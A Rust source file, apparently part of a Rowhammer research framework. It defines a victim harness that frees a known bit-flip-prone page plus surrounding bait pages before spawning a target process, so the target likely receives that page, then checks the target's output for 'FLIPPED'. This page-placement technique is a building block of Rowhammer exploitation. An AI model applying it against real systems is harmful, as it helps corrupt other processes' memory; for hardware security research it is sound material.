use std::ptr::null_mut;

use crate::{allocator::util::mmap, util::PAGE_SIZE};

use super::HammerVictim;

pub struct StackProcess {
    child: Option<std::process::Child>,
}

/// The injection configuration.
pub struct InjectionConfig {
    /// The flippy page.
    pub flippy_page: *mut libc::c_void,
    /// The number of bait pages to release before the flippy page.
    pub bait_count_after: usize,
    /// The number of bait pages to release after the flippy page.
    pub bait_count_before: usize,
}

impl StackProcess {
    /// Create a new `StackProcess` victim.
    ///
    /// # Arguments
    /// - `target`: The path to the target binary and args.
    /// - `injection_config`: The injection configuration.
    pub fn new(target: &[String], injection_config: InjectionConfig) -> anyhow::Result<Self> {
        let bait = mmap(
            null_mut(),
            (injection_config.bait_count_before + injection_config.bait_count_after) * PAGE_SIZE,
        );
        let mut cmd = std::process::Command::new(target.first().expect("No target provided"));
        cmd.args(target[1..].to_vec());
        cmd.stdout(std::process::Stdio::piped());
        cmd.stderr(std::process::Stdio::piped());
        // dealloc
        unsafe {
            libc::munmap(bait, injection_config.bait_count_before * PAGE_SIZE);
            libc::munmap(injection_config.flippy_page, PAGE_SIZE);
            libc::munmap(
                bait.byte_add(injection_config.bait_count_before * PAGE_SIZE),
                injection_config.bait_count_after * PAGE_SIZE,
            );
        }
        // spawn
        let child = cmd.spawn()?;
        // todo: maybe check injection (prime+probe?)
        Ok(Self { child: Some(child) })
    }
}

impl HammerVictim<String> for StackProcess {
    fn init(&mut self) {}

    fn check(&mut self) -> Option<String> {
        let child = self.child.take();
        match child {
            Some(child) => {
                let output = child.wait_with_output();
                match output {
                    Ok(output) => {
                        let stdout = String::from_utf8_lossy(&output.stdout);
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        info!("Victim stdout: {}", stdout);
                        info!("Victim stderr: {}", stderr);
                        if stdout.contains("FLIPPED") {
                            Some(format!("stdout: {}", stdout))
                        } else {
                            None
                        }
                    }
                    Err(e) => {
                        error!("Error: {}", e);
                        None
                    }
                }
            }
            None => None,
        }
    }

    fn stop(self) {}
}
